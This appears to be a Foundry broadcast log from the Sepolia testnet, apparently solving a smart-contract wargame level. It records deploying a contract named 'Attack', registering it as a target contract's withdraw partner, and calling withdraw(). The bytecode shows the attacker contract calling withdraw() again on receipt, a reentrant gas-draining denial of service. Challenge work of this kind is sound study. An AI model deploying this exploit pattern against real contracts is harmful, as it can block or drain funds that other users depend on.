{
  "transactions": [
    {
      "hash": "0xfecfe33320e40fae6097c1cfe2e94fe331bce6cc086f154fbe8e9e57bf8c0a6e",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0x7ab0a745ced538585dffe7c2f7f97fbaa3ca9c19",
      "function": null,
      "arguments": [
        "0x89D93583E73A02dec478258278796A6F35308362"
      ],
      "transaction": {
        "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
        "gas": "0x23016",
        "value": "0x0",
        "input": "0x6080604052348015600e575f5ffd5b5060405161011b38038061011b833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6096806100855f395ff3fe6080604052348015600e575f5ffd5b505f805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b158015604d575f5ffd5b505af1158015605e573d5f5f3e3d5ffd5b00fea26469706673582212209f2c21ac12227863f28a23eff2506283358791e7576941fdf93fd07528daa45d64736f6c634300081c003300000000000000000000000089d93583e73a02dec478258278796a6f35308362",
        "nonce": "0xe6",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x64fab3fb92ad61c87a31192e4076f0d940208dedbb4d5a1d8e6a7ca81f2d53cd",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x89d93583e73a02dec478258278796a6f35308362",
      "function": "setWithdrawPartner(address)",
      "arguments": [
        "0x7AB0a745CED538585DFFE7c2F7f97FBaa3CA9C19"
      ],
      "transaction": {
        "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
        "to": "0x89d93583e73a02dec478258278796a6f35308362",
        "gas": "0x9066",
        "value": "0x0",
        "input": "0x4e1c59140000000000000000000000007ab0a745ced538585dffe7c2f7f97fbaa3ca9c19",
        "nonce": "0xe7",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xe05d165981099fea356f4d83460bf99a38bbb8865dd798f52c5615ee5cd7ec6d",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x89d93583e73a02dec478258278796a6f35308362",
      "function": "withdraw()",
      "arguments": [],
      "transaction": {
        "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
        "to": "0x89d93583e73a02dec478258278796a6f35308362",
        "gas": "0x17799",
        "value": "0x0",
        "input": "0x3ccfd60b",
        "nonce": "0xe8",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xd3a751",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xfecfe33320e40fae6097c1cfe2e94fe331bce6cc086f154fbe8e9e57bf8c0a6e",
      "transactionIndex": "0xbb",
      "blockHash": "0xbaf3f96498a232fabb70abf4b4f90e2ea49fbd52088a6cb0fd41a1a000970fc0",
      "blockNumber": "0x75e75d",
      "gasUsed": "0x1aed6",
      "effectiveGasPrice": "0x6bab6cf9a",
      "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
      "to": null,
      "contractAddress": "0x7ab0a745ced538585dffe7c2f7f97fbaa3ca9c19"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xd40fdd",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x64fab3fb92ad61c87a31192e4076f0d940208dedbb4d5a1d8e6a7ca81f2d53cd",
      "transactionIndex": "0xbc",
      "blockHash": "0xbaf3f96498a232fabb70abf4b4f90e2ea49fbd52088a6cb0fd41a1a000970fc0",
      "blockNumber": "0x75e75d",
      "gasUsed": "0x688c",
      "effectiveGasPrice": "0x6bab6cf9a",
      "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
      "to": "0x89d93583e73a02dec478258278796a6f35308362",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xd51fcb",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xe05d165981099fea356f4d83460bf99a38bbb8865dd798f52c5615ee5cd7ec6d",
      "transactionIndex": "0xbd",
      "blockHash": "0xbaf3f96498a232fabb70abf4b4f90e2ea49fbd52088a6cb0fd41a1a000970fc0",
      "blockNumber": "0x75e75d",
      "gasUsed": "0x10fee",
      "effectiveGasPrice": "0x6bab6cf9a",
      "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
      "to": "0x89d93583e73a02dec478258278796a6f35308362",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1739796242,
  "chain": 11155111,
  "commit": "ab8a5cd"
}